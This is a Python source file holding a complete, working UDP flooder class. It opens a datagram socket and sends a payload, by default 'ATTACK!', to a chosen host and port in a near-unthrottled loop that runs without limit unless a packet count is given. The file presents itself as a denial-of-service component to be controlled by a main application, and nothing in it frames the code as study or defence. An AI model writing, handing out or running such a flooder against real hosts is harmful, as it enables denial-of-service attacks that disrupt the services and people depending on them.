import socket
import time

class Flooder():
    """
    A core UDP flooder class for sending packets.
    Designed to be imported and controlled by a/the main application.
    """

    def __init__(self, target_host: str, target_port: int, message: str = "ATTACK!"):
        """
        Initializes the Flooder with target details and default message.
        """
        if not isinstance(target_host, str) or not target_host:
            raise ValueError("target_host must be a non-empty string.")
        if not isinstance(target_port, int) or not (0 < target_port < 65536):
            raise ValueError("target_port must be a valid port number (1-65535).")
        if not isinstance(message, str):
            raise ValueError("message must be a string.")

        self.target_host = target_host
        self.target_port = target_port
        self._default_message = message.encode()

        self.running: bool = True
        self.socket = None
        self.packets_sent = 0

    def start(self, packet_count: int = -1, message: bytes = None):
        """
        Starts the UDP flooding process.
        """
        print(f"[i] Starting UDP flood on {self.target_host}:{self.target_port}")
        print(f"[i] Using message: {self._default_message.decode() if message is None else message.decode()}")
        
        # Use the provided message or the default one
        message_to_send = message if message is not None else self._default_message

        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            while self.running and (packet_count == -1 or self.packets_sent < packet_count):
                try:
                    self.socket.sendto(message_to_send, (self.target_host, self.target_port))
                    self.packets_sent += 1
                    # Print progress every 1000 packets or so, to reduce console spam
                    if self.packets_sent % 1000 == 0:
                        print(f"[+] Sent {self.packets_sent} packets.")

                    time.sleep(0.00001) # Uncommented for local testing

                except socket.error as e:
                    print(f"[!] Socket Error sending to {self.target_host}:{self.target_port}: {e}")
                    self.stop() # Stop on persistent socket errors
                except Exception as e:
                    print(f"[!] General Error: {e}")
                    self.stop() # Stop on other unexpected errors

        except KeyboardInterrupt:
            # Handle KeyboardInterrupt from the main script
            print("\n[i] Flood interrupted by user (Ctrl+C).")
        finally:
            self.stop()

    def stop(self):
        """Stops the flooder and cleans up resources."""

        # Only perform stop actions if still running
        if self.running:
            self.running = False
            print(f"\n[i] Stopping flooder. Total packets sent: {self.packets_sent}")
            if self.socket:
                self.socket.close()
                print("[i] Flooder socket closed.")
